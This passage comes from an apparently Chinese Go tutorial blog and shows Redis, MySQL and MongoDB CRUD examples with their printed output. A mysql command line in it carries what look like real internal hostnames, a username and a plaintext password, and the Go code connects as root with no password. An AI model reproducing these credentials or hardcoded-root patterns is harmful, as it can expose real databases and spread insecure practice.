&#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis LRange成功，key：%s, vals:%v\n&quot;</span>, <span class="string">&quot;uids&quot;</span>, vals2)  <span class="comment">//redis LRange成功，key：uids, vals:[132 154 1000]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =====================================集合操作=============================</span></span><br><span class="line"><span class="comment">//redis集合特性：元素无序且唯一</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量入集合</span></span><br><span class="line">err = rdb.SAdd(ctx, <span class="string">&quot;students&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;James&quot;</span>, <span class="string">&quot;James&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SAdd失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取集合大小</span></span><br><span class="line">size, err := rdb.SCard(ctx, <span class="string">&quot;students&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SCard失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SCard成功，key：%s, size:%v\n&quot;</span>, <span class="string">&quot;students&quot;</span>, size)  <span class="comment">//redis SCard成功，key：students, size:2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回集合所有元素</span></span><br><span class="line">sMem, err := rdb.SMembers(ctx, <span class="string">&quot;students&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SMembers失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SMembers成功，key：%s, size:%v\n&quot;</span>, <span class="string">&quot;students&quot;</span>, sMem)  <span class="comment">//redis SMembers成功，key：students, size:[James Alice]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断元素是否在集合中</span></span><br><span class="line">flag, err := rdb.SIsMember(ctx, <span class="string">&quot;students&quot;</span>, <span class="string">&quot;James&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SIsMember失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SIsMember成功，key：%s, size:%v\n&quot;</span>, <span class="string">&quot;students&quot;</span>, flag)  <span class="comment">//redis SIsMember成功，key：students, size:true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除集合元素</span></span><br><span class="line">err = rdb.SRem(ctx, <span class="string">&quot;students&quot;</span>, <span class="string">&quot;Alice&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis SRem失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =============================hash操作========================</span></span><br><span class="line"><span class="comment">// 多级嵌套HASH  China 是hash Guangdong 是字段名, Tencent是字段值</span></span><br><span class="line">err = rdb.HSet(ctx, <span class="string">&quot;China&quot;</span>, <span class="string">&quot;Guangdong&quot;</span>, <span class="string">&quot;Tencent&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redisHSet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hvar, err := rdb.HGet(ctx, <span class="string">&quot;China&quot;</span>, <span class="string">&quot;Guangdong&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HGet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HGet成功，hvar:%v\n&quot;</span>, hvar) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = rdb.HSet(ctx, <span class="string">&quot;China&quot;</span>, <span class="string">&quot;Hanzhou&quot;</span>, <span class="string">&quot;Alibaba&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HSet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回的是个map</span></span><br><span class="line">hvarAll, err := rdb.HGetAll(ctx, <span class="string">&quot;China&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HGetAll失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HGetAll成功，hvarAll:%v\n&quot;</span>, hvarAll)    <span class="comment">//redis HGetAll成功，hvarAll:map[Guangdong:Tencent Hanzhou:Alibaba]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将map塞进hash</span></span><br><span class="line">batchData := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">batchData[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;test&quot;</span></span><br><span class="line">batchData[<span class="string">&quot;password&quot;</span>] = <span class="number">123456</span></span><br><span class="line">err = rdb.HMSet(ctx, <span class="string">&quot;users&quot;</span>, batchData).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HMSet失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hvarAll, err = rdb.HGetAll(ctx, <span class="string">&quot;users&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HGetAll失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HGetAll成功，hvarAll:%v\n&quot;</span>, hvarAll)   <span class="comment">//redis HGetAll成功，hvarAll:map[password:123456 username:test]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;Hanzhou&quot;字段不存在才Set</span></span><br><span class="line">err = rdb.HSetNX(ctx, <span class="string">&quot;China&quot;</span>, <span class="string">&quot;Hanzhou&quot;</span>, <span class="string">&quot;Netease&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HSetNX失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对key的值+n</span></span><br><span class="line">count, err := rdb.HIncrBy(ctx, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">10</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HIncrBy失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HIncrBy成功，count:%v\n&quot;</span>, count)   <span class="comment">// redis HIncrBy成功，count:123466</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回所有key,返回值是个string数组</span></span><br><span class="line">keys, err := rdb.HKeys(ctx, <span class="string">&quot;China&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redisHKeys失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HKeys成功，keys:%v\n&quot;</span>, keys)   <span class="comment">//redis HKeys成功，keys:[Guangdong Hanzhou]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据key，查询hash的字段数量</span></span><br><span class="line">hlen, err := rdb.HLen(ctx, <span class="string">&quot;China&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HLen失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HLen成功，hlen:%v\n&quot;</span>, hlen)   <span class="comment">// redis HLen成功，hlen:2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除多个key</span></span><br><span class="line">err = rdb.HDel(ctx, <span class="string">&quot;China&quot;</span>, <span class="string">&quot;Hanzhou&quot;</span>, <span class="string">&quot;Guangdong&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis HDel失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================================有序集合sort set================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Z 表示已排序的集合成员</span></span><br><span class="line"><span class="comment">type Z struct &#123;</span></span><br><span class="line"><span class="comment">Score  float64  // 分数</span></span><br><span class="line"><span class="comment">Member interface&#123;&#125; // 元素名</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">zsetKey := <span class="string">&quot;companys_rank&quot;</span></span><br><span class="line">companys := []*redis.Z&#123;</span><br><span class="line">&#123;Score: <span class="number">100.0</span>, Member: <span class="string">&quot;Apple&quot;</span>&#125;,</span><br><span class="line">&#123;Score: <span class="number">90.0</span>, Member: <span class="string">&quot;MicroSoft&quot;</span>&#125;,</span><br><span class="line">&#123;Score: <span class="number">70.0</span>, Member: <span class="string">&quot;Amazon&quot;</span>&#125;,</span><br><span class="line">&#123;Score: <span class="number">87.0</span>, Member: <span class="string">&quot;Google&quot;</span>&#125;,</span><br><span class="line">&#123;Score: <span class="number">77.0</span>, Member: <span class="string">&quot;Facebook&quot;</span>&#125;,</span><br><span class="line">&#123;Score: <span class="number">67.0</span>, Member: <span class="string">&quot;Tesla&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = rdb.ZAdd(ctx, zsetKey, companys...).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZAdd失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = rdb.ZIncrBy(ctx, zsetKey, <span class="number">2</span>, <span class="string">&quot;Amazon&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZIncrBy失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回从0到-1位置的集合元素， 元素按分数从小到大排序 </span></span><br><span class="line">rank, err := rdb.ZRange(ctx, zsetKey, <span class="number">0</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRange成功，rank:%v\n&quot;</span>, rank)   <span class="comment">//redis ZRange成功，rank:[Tesla Amazon Facebook Google MicroSoft Apple]</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//返回top3</span></span><br><span class="line">rank, err = rdb.ZRange(ctx, zsetKey, <span class="number">-3</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRange成功，rank:%v\n&quot;</span>, rank)   <span class="comment">//redis ZRange成功，rank:[Google MicroSoft Apple]</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">op := &amp;redis.ZRangeBy&#123;</span><br><span class="line">Min:<span class="string">&quot;80&quot;</span>, <span class="comment">// 最小分数</span></span><br><span class="line">Max:<span class="string">&quot;100&quot;</span>, <span class="comment">// 最大分数</span></span><br><span class="line">Offset:<span class="number">0</span>, <span class="comment">// 类似sql的limit, 表示开始偏移量</span></span><br><span class="line">Count:<span class="number">2</span>, <span class="comment">// 一次返回多少数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///根据分数范围返回集合元素，实现排行榜，取top n</span></span><br><span class="line">rank, err = rdb.ZRangeByScore(ctx, zsetKey, op).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRangeByScore失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRangeByScore成功，rank:%v\n&quot;</span>, rank)   <span class="comment">//redis ZRangeByScore成功，rank:[Google MicroSoft]</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//根据元素名，查询集合元素在集合中的排名，从0开始算，集合元素按分数从小到大排序</span></span><br><span class="line">rk, err := rdb.ZRank(ctx, zsetKey, <span class="string">&quot;Apple&quot;</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRank失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRank成功，rk:%v\n&quot;</span>, rk)  <span class="comment">// redis ZRank成功，rk:5</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 一次删除多个key</span></span><br><span class="line">err = rdb.ZRem(ctx, zsetKey, <span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Amazon&quot;</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRem失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//集合元素按分数排序，从最低分到高分，删除第0个元素到第1个元素。 这里相当于删除最低分的2个元素</span></span><br><span class="line">err = rdb.ZRemRangeByRank(ctx, zsetKey, <span class="number">0</span>, <span class="number">1</span>).Err()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRemRangeByRank失败，错误信息：%v\n&quot;</span>, err) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rank, err = rdb.ZRange(ctx, zsetKey, <span class="number">0</span>, <span class="number">-1</span>).Result()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRange失败，错误信息：%v\n&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;redis ZRange成功，rank:%v\n&quot;</span>, rank)     <span class="comment">//redis ZRange成功，rank:[Google MicroSoft]</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">成功连接redis, PONG</span><br><span class="line">redis get成功，key：guid, val:89_1909979_2232118</span><br><span class="line">redis Del成功，key：guid</span><br><span class="line">redis get失败，错误信息：redis: nil</span><br><span class="line">redis TTL成功，key：task, tm:-1ns</span><br><span class="line">redis get成功，key：task, val:456</span><br><span class="line">redis get成功，key：task, val:456</span><br><span class="line">redis GetSet成功，key：task, oldVal:456</span><br><span class="line">redis MGet成功，vals：[val1 val2 val3]</span><br><span class="line">redis get成功，key：age, val:60</span><br><span class="line">redis TTL成功，key：key1, tm:3s</span><br><span class="line">redis LRange成功，key：uids, vals:[132 154 140 130 130]</span><br><span class="line">redis LRange成功，key：uids, vals:[140 130 130]</span><br><span class="line">redis LLen成功，key：uids, llen:5</span><br><span class="line">redis LRange成功，key：uids, vals:[132 154 1000 130 130]</span><br><span class="line">redis LRange成功，key：uids, vals:[132 154 1000 130]</span><br><span class="line">redis LRange成功，key：uids, vals:[132 154 1000]</span><br><span class="line">redis SCard成功，key：students, size:2</span><br><span class="line">redis SMembers成功，key：students, size:[Alice James]</span><br><span class="line">redis SIsMember成功，key：students, size:true</span><br><span class="line">redis HGet成功，hvar:Tencent</span><br><span class="line">redis HGetAll成功，hvarAll:map[Guangdong:Tencent Hanzhou:Alibaba]</span><br><span class="line">redis HGetAll成功，hvarAll:map[password:123456 username:test]</span><br><span class="line">redis HIncrBy成功，count:123466</span><br><span class="line">redis HKeys成功，keys:[Guangdong Hanzhou]</span><br><span class="line">redis HLen成功，hlen:2</span><br><span class="line">redis ZRange成功，rank:[Tesla Amazon Facebook Google MicroSoft Apple]</span><br><span class="line">redis ZRange成功，rank:[Google MicroSoft Apple]</span><br><span class="line">redis ZRangeByScore成功，rank:[Google MicroSoft]</span><br><span class="line">redis ZRank成功，rk:5</span><br><span class="line">redis ZRange成功，rank:[Google MicroSoft]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>命令行连接msyql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h mhxy-dev-130073-m.hz.dumbo.nie.netease.com -P 3306 -uxy1 -pmhxygamekingxy -A</span><br></pre></td></tr></table></figure><p>mysql的CRUD实践案例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/jmoiron/sqlx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Cguid<span class="keyword">string</span>    <span class="string">`db:&quot;cguid&quot;`</span></span><br><span class="line">    Username <span class="keyword">string</span> <span class="string">`db:&quot;name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *sqlx.DB</span><br><span class="line"></span><br><span class="line"><span class="comment">//init()函数会在每个包完成初始化后自动执行，并且执行优先级比main函数高。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    database, err := sqlx.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:@tcp(inner.mhxy.nie.netease.com)/pyc2021&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;open mysql failed,&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Db = database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询</span></span><br><span class="line">    <span class="keyword">var</span> person []Person</span><br><span class="line">    err := Db.Select(&amp;person, <span class="string">&quot;select cguid, name from pyc2021_match limit 10;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;exec failed, &quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;select succ:&quot;</span>, person)</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过Db.Select方法将查询的多行数据保存在一个切片中，然后就可以通过循环的方式获取每行数据</span></span><br><span class="line"><span class="keyword">for</span> _, info := <span class="keyword">range</span> person &#123;</span><br><span class="line">cguid := info.Cguid</span><br><span class="line">name := info.Username</span><br><span class="line">fmt.Println(<span class="string">&quot;mysql select, &quot;</span>, cguid, name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入</span></span><br><span class="line">    r, err := Db.Exec(<span class="string">&quot;insert into pyc2021_match(cguid, vote, name, hostnum)values(&#x27;781122223&#x27;, 200, &#x27;这是一个测试&#x27;, 90)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;exec failed, &quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    id, err := r.LastInsertId()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;exec failed, &quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;insert succ:&quot;</span>, id)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新</span></span><br><span class="line">res, err := Db.Exec(<span class="string">&quot;update pyc2021_match set name=&#x27;修改测试&#x27; where cguid=&#x27;98977999&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;exec failed, &quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    row, err := res.RowsAffected()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;rows failed, &quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;update succ:&quot;</span>,row)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line">res, err = Db.Exec(<span class="string">&quot;delete from pyc2021_match where cguid=&#x27;98977999&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;exec failed, &quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    row,err = res.RowsAffected()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;rows failed, &quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;delete succ: &quot;</span>,row)</span><br><span class="line"></span><br><span class="line">Db.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select succ: [&#123;7822223 xxxx1&#125; &#123;7832223 xsxxx1&#125; &#123;7832233 xsx99&#125; &#123;22223 西红柿&#125; &#123;98977999 修改测试&#125; &#123;78222223 这是一个测试&#125; &#123;78122223 这是一个测试&#125;]</span><br><span class="line">mysql select,  7822223 xxxx1</span><br><span class="line">mysql select,  7832223 xsxxx1</span><br><span class="line">mysql select,  7832233 xsx99</span><br><span class="line">mysql select,  22223 西红柿</span><br><span class="line">mysql select,  98977999 修改测试</span><br><span class="line">mysql select,  78222223 这是一个测试</span><br><span class="line">mysql select,  78122223 这是一个测试</span><br><span class="line">insert succ: 12</span><br><span class="line">update succ: 0</span><br><span class="line">delete succ:  1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h1><p>命令行连接mongodb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo mongodb:&#x2F;&#x2F;root:123@127.0.0.1:30002&#x2F;xyq</span><br></pre></td></tr></table></figure><p>mongodb的CRUD实践如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 